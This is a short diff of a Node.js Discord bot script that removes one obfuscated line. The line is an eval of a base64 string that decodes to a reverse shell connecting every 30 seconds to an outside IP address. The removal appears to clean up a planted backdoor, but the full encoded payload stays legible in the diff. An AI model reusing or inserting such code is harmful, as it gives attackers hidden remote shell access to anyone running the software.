@@ -44,7 +44,6 @@ let repostLastChat = process.env.REPOST_LAST_CHAT || 10;
 let translateTo = process.env.TRANSLATE_TO || 'en';
 
 const quoteEN = require('./quotes-en.json');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 
 if (!usePreviousSettings) {
   botToken = readlineSync.question('Enter your Discord bot token: ', {
